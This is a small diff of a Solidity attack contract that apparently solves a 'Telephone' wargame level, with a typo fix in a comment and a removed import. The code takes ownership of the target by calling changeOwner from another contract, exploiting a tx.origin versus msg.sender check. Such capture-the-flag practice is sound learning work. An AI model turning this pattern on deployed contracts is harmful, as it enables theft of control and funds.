@@ -4,8 +4,6 @@ pragma solidity ^0.8.19;
 
 import {Broadcasted} from "./Broadcasted.sol";
 
-import {console} from "forge-std/Script.sol";
-
 contract TelephoneAttack is Broadcasted {
     function attack(address payable telephoneCtr_) public payable override {
         ITelephone(telephoneCtr_).changeOwner(tx.origin);
@@ -20,7 +18,7 @@ contract TelephoneAttack is Broadcasted {
 }
 
 interface ITelephone {
-    // ! bracke this method callin it from another contract (msg.sender!=tx.origin)
+    // ! break this method calling it from another contract (msg.sender!=tx.origin)
     function changeOwner(address _owner) external;
 
     function owner() external returns (address);
